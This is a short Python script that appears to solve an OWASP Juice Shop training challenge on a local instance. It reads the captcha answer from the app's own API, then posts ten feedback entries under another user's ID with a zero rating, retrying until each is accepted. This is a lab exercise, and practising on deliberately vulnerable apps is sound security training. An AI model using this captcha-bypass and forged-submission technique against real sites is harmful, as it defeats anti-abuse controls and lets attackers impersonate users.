import requests

myobj={"UserId":2,"captchaId":0,"captcha":"","comment":"site heheheheh (***@juice-sh.op)","rating":0}
url = "http://127.0.0.1:3000/api/Feedbacks/"


x = requests.get("http://localhost:3000/rest/captcha/")
newcaptcha = x.json()
myobj["captchaId"]=newcaptcha["captchaId"]
myobj["captcha"]= newcaptcha["answer"]
for i in range(10):
    status = 0
    while status!=201:
        x = requests.post(url, data = myobj)
        status = x.status_code
    print(f"Sent {i} requests",end = "\r")
print("Sent 10 requests\nChallenge completed")

